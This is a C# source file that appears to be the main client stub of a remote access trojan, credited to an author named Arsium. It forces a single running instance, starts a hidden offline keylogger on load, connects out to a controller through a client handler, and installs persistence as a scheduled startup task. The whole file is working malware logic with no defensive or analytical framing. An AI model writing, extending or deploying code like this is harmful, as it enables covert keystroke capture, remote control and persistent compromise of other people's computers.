using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Client
{
    public class StarterClass
    {
        internal static bool KeylogOn;
        private static bool AlreadyLaunched = false;
        private static Mutex mutex;
        public static void OneInstance()
        {
            mutex = new Mutex(true, Config.mutex, out AlreadyLaunched);
            if (!AlreadyLaunched)
            {
                NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
            }
        }

        static StarterClass() 
        {
            KeylogOn = false;
            clientHandler = new ClientHandler();
            StartOfflineKeylogger();
        }

        internal static void StartOfflineKeylogger()
        {
            if (!KeylogOn && Config.offKeylog != "False")
            {
                Offline.Keyloggers.Launch.Start();
                KeylogOn = true;
            }
        }

        [DllImport("ntdll.dll")]
        internal static extern uint NtTerminateProcess(IntPtr hProcess, int errorStatus);

        internal static ClientHandler clientHandler;

        [MTAThread]
        public static void Main() 
        {
            OneInstance();
            clientHandler.ConnectStart();
            MakeInstall();
            new Thread(new ThreadStart(() => {
                while (true)
                {
                    Thread.Sleep(-1);
                }
            })).Start();
        }

        public static void MakeInstall()
        {
            Offline.Persistence.TaskScheduler.StartUpTaskScheduler(Config.time, Config.taskName);
        }
    }
}
